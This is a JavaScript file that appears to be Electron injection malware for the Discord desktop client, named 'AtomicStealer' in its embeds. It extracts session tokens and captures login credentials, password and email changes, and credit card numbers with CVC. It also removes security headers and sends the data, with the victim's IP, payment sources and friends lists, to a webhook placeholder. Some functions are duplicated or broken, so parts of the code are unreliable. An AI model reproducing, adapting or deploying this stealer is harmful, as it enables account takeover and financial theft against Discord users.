
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron')
const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
var webhook = "%WEBHOOK_LINK%";

function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "Blood"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "Blood"));
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
    return !1
}

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(webhook)) {
        if (details.url.includes("discord.com")) {
            callback({
                responseHeaders: Object.assign({
                    'Access-Control-Allow-Headers': "*"
                }, details.responseHeaders)
            });
        } else {
            callback({
                responseHeaders: Object.assign({
                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                    'Access-Control-Allow-Headers': "*",
                    "Access-Control-Allow-Origin": "*"
                }, details.responseHeaders)
            });
        }


    } else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];

        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': "*"
            }
        })
    }

})

const Filter = {
    "urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
    if (FirstTime()) {}

    callback({})
    return;
})

function SendToWebhook(info) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
        xhr.open("POST", "${webhook}", true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
        xhr.send(JSON.stringify(${info}));
    `, !0)
}

function GetNitro(type) {
    if (type == 0) {
        return "No"
    }
    if (type == 1) {
        return "\`Nitro Classic\`"
    }
    if (type == 2) {
        return "\`Nitro Boost\`"
    } else {
        return "No"
    }
}

function GetBadges(flags) {
    const Discord_Employee = 1;
    const Partnered_Server_Owner = 2;
    const HypeSquad_Events = 4;
    const Bug_Hunter_Level_1 = 8;
    const House_Bravery = 64;
    const House_Brilliance = 128;
    const House_Balance = 256;
    const Early_Supporter = 512;
    const Bug_Hunter_Level_2 = 16384;
    const Early_Verified_Bot_Developer = 131072;
    var badges = "";
    if ((flags & Discord_Employee) == Discord_Employee) {
        badges += "Discord Staff, "
    }
    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
        badges += "Partnered Server Owner, "
    }
    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
        badges += "Hypesquad Event, "
    }
    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
        badges += "Green Bughunter, "
    }
    if ((flags & House_Bravery) == House_Bravery) {
        badges += "Hypesquad Bravery, "
    }
    if ((flags & House_Brilliance) == House_Brilliance) {
        badges += "HypeSquad Brillance, "
    }
    if ((flags & House_Balance) == House_Balance) {
        badges += "HypeSquad Balance, "
    }
    if ((flags & Early_Supporter) == Early_Supporter) {
        badges += "Early Supporter, "
    }
    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
        badges += "Gold BugHunter, "
    }
    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
        badges += "Discord Developer, "
    }
    if (badges == "") {
        badges = "None"
    }
    return badges
}

function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
                window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
                    function totalFriends() {
                        var f = JSON.parse(info4)
                        const r = f.filter((user) => {
                            return user.type == 1
                        })
                        return r.length
                    }

                    function CalcFriends() {
                        var f = JSON.parse(info4)
                        const r = f.filter((user) => {
                            return user.type == 1
                        })
                        var gay = "";
                        for (z of r) {
                            var b = GetRBadges(z.user.public_flags)
                            if (b != "") {
                                gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                            }
                        }
                        if (gay == "") {
                            gay = "--"
                        }
                        return gay
                    }

                    function Cool() {
                        const json = JSON.parse(info3)
                        var billing = "";
                        json.forEach(z => {
                            if (z.type == "") {
                                return "\`No\`"
                            } else if (z.type == 2 && z.invalid != !0) {
                                billing += "\`Yes\`" + " <:Paypal:940600331002318879>"
                            } else if (z.type == 1 && z.invalid != !0) {
                                billing += "\`Yes\`" + " :credit_card:"
                            } else {
                                return "\`No\`"
                            }
                        })
                        if (billing == "") {
                            billing = "\`No\`"
                        }
                        return billing
                    }
        const json = JSON.parse(info);
        var params = {
            username: "Atomic",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
            embeds: [
                {
                    "color": 000000,
                    "fields": [
                        {
                            "name": "Username :",
                            "value":  json.username +"#" + json.discriminator ,
                            "inline": false

                        },

                        {
                            "name": ":unlock: | Token :",
                            "value": `\`${token}\``,
                            "inline": false
                        },
                        
                        
                        {
                            "name": "<:8485discordemployee:940583845063979008> | Info :",
                            "value": `Email: \`${email}\` \nPassword: \`${password}\``,
                            "inline": false
                        },


                        {
                            "name": "<a:discord_gif:709806861351911445> | Other :",
                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                            "inline": false
                        },


                        {
                            "name": ":globe_with_meridians: | Ip :",
                            "value": `\`${ip}```,
                            "inline": false
                        }
                    ],
                    "author": {
                        
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    }
                 }, {
                        "title": `Total Friends (${totalFriends()})`,
                        "description": CalcFriends(),
                        "author": {
                            "name": "AtomicStealer"
                        },
                        "footer": {
                            "text": "AtomicStealer"
                        },
                        "thumbnail": {
                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                        }
                    }]
                }
                SendToWebhook(JSON.stringify(params))
            })
        })
    })
})
}

function ChangePassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
            window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
            function Cool() {
                const json = JSON.parse(info3)
                var billing = "";
                json.forEach(z => {
                    if (z.type == "") {
                        return "\`No\`"
                    } else if (z.type == 2 && z.invalid != !0) {
                        billing += "\`Yes\`" + " <:Paypal:940600331002318879>"
                    } else if (z.type == 1 && z.invalid != !0) {
                        billing += "\`Yes\`" + " :credit_card:"
                    } else {
                        return "\`No\`"
                    }
                })
                if (billing == "") {
                    billing = "\`No\`"
                }
                return billing
            }
        const json = JSON.parse(info);
        var params = {
            username: "Atomic",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
            embeds: [
                {
                    "color": 000000,
                    "fields": [
                        {
                            "name": "<:8485discordemployee:940583845063979008> | Password Changed :",
                            "value": `Email: \`${json.email}\`\nOld Password: \`${oldpassword}\`\nNew Password: \`${newpassword}\``,
                            "inline": false
                        },


                        {
                            "name": ":unlock: | Token :",
                            "value": `\`${token}\``,
                            "inline": false
                        },


                        {
                            "name": "<a:discord_gif:709806861351911445> | Other :",
                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                            "inline": true
                        },


                        {
                            "name": ":globe_with_meridians: | Ip :",
                            "value": `\`${ip}```,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + " ("+json.id+")",
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    }
                }, {
                    "title": `Total Friends (${totalFriends()})`,
                    "description": CalcFriends(),
                    "author": {
                        "name": "AtomicStealer"
                    },
                    "footer": {
                        "text": "AtomicStealer"
                    },
                    "thumbnail": {
                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                    }
                }]
            }
            SendToWebhook(JSON.stringify(params))
        })
    })
})
}

function ChangePassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
            window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
            function Cool() {
                const json = JSON.parse(info3)
                var billing = "";
                json.forEach(z => {
                    if (z.type == "") {
                        return "\`No\`"
                    } else if (z.type == 2 && z.invalid != !0) {
                        billing += "\`Yes\`" + " <:Paypal:940600331002318879>"
                    } else if (z.type == 1 && z.invalid != !0) {
                        billing += "\`Yes\`" + " :credit_card:"
                    } else {
                        return "\`No\`"
                    }
                })
                if (billing == "") {
                    billing = "\`No\`"
                }
                return billing
            }
        var json = JSON.parse(info);
        var params = {
            username: "Atomic",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
            embeds: [
                {
                    "color": 000000,
                    "fields": [
                        {
                            "name": "<:8485discordemployee:940583845063979008> | Email Changed :",
                            "value": `New Email: \`${newemail}\`\nPassword: \`${password}\``,
                            "inline": false
                        },
                        
                        
                        {
                            "name": ":unlock: | Token :",
                            "value": `\`${token}\``,
                            "inline": false
                        },
                        
                        
                        {
                            "name": "<a:discord_gif:709806861351911445> | Other :",
                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                            "inline": false
                        },


                        {
                            "name": ":globe_with_meridians: | Ip :",
                            "value": `\`${ip}```,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + " ("+json.id+")",
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": "AtomicStealer"
                    }
                }]
            }
            SendToWebhook(JSON.stringify(params))
        })
    })
})
}

function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
        var json = JSON.parse(info);
        var params = {
            username: "Atomic",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
            embeds: [
                {
                    "color": 000000,
                    "fields": [
                        {
                            "name": ":credit_card: | Credit Card Added",
                            "value": `Credit Card Number: \`${number}\`\nCVC: \`${cvc}\`\nCredit Card Expiration: \`${expir_month}/${expir_year}\``,
                            "inline": false
                        },


                        {
                            "name": ":unlock: | Token :",
                            "value": `\`${token}\``,
                            "inline": false
                        },

                        
                        {
                            "name": "<a:discord_gif:709806861351911445> | Other :",
                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                            "inline": false
                        },


                        {
                            "name": ":globe_with_meridians: | Ip :",
                            "value": `\`${ip}```,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + " ("+json.id+")",
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": "AtomicStealer"
                    }
                }]
            }
            SendToWebhook(JSON.stringify(params))
        })
    })
}

const UrlFilter = {
    urls: ["https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => {
    if (details.url.endsWith("login")) {
        if (details.statusCode == 200) {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            const email = data.login;
            const password = data.password;
            const window = BrowserWindow.getAllWindows()[0];
            window.webContents.executeJavaScript(TokenEval, !0).then((token => {
                Login(email, password, token)
            }))
        }
    }
    if (details.url.endsWith("users/@me")) {
        if (details.statusCode == 200 && details.method == "PATCH") {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            if (data.password != null && data.password != undefined && data.password != "") {
                if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(TokenEval, !0).then((token => {
                        ChangePassword(data.password, data.new_password, token)
                    }))
                }
                if (data.email != null && data.email != undefined && data.email != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(TokenEval, !0).then((token => {
                        ChangeEmail(data.email, data.password, token)
                    }))
                }
            }
        }
    }
    if (details.url.endsWith("tokens")) {
        const item = querystring.parse(details.uploadData[0].bytes.toString())
        const window = BrowserWindow.getAllWindows()[0];
        window.webContents.executeJavaScript(TokenEval, !0).then((token => {
            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
        }))
    }
});
module.exports = require('./core.asar')
